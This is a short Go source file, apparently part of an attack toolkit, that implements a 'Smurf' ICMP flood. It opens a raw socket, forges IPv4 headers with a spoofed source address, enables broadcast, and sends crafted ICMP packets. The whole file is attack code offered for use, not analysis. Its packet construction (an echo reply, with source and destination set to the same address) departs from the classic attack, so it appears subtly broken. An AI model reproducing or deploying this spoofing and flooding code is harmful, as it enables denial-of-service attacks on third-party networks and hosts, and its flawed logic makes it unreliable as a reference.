package smurf

import (
	"SSLCN/internal/protocol/icmp"
	"bytes"
	"golang.org/x/net/ipv4"
	"net"
	"syscall"
)

type Smurf struct {
	fd  int
	dst net.IP
}

func (s Smurf) Run() error {
	id := 13371

	header := ipv4.Header{
		Len:      20,
		Version:  4,
		TOS:      5,
		ID:       id,
		TTL:      64,
		Src:      s.dst,
		Dst:      s.dst,
		Protocol: syscall.IPPROTO_ICMP,
	}

	marshal, err := header.Marshal()
	if err != nil {
		return err
	}

	buffer := new(bytes.Buffer)
	buffer.Write([]byte("HEY"))
	pack, err := icmp.Pack(icmp.NewEchoReply(uint16(id), 1), buffer)
	if err != nil {
		return err
	}

	buf := bytes.NewBuffer(marshal)
	buf.Write(pack.Bytes())

	sa := syscall.SockaddrInet4{}
	copy(sa.Addr[:], s.dst)

	err = syscall.Sendto(s.fd, buf.Bytes(), 0, &sa)
	if err != nil {
		return err
	}

	return nil
}

func New(destination string) (*Smurf, error) {
	dst, err := net.ResolveIPAddr("ip4", destination)
	if err != nil {
		return nil, err
	}

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
	if err != nil {
		return nil, err
	}

	addr, err := net.ResolveIPAddr("ip4", "")
	if err != nil {
		return nil, err
	}

	sa := syscall.SockaddrInet4{}
	copy(sa.Addr[:], addr.IP)

	err = syscall.Bind(fd, &sa)
	if err != nil {
		return nil, err
	}

	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		return nil, err
	}

	err = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_BROADCAST, 1)
	if err != nil {
		return nil, err
	}

	return &Smurf{fd, dst.IP}, err
}
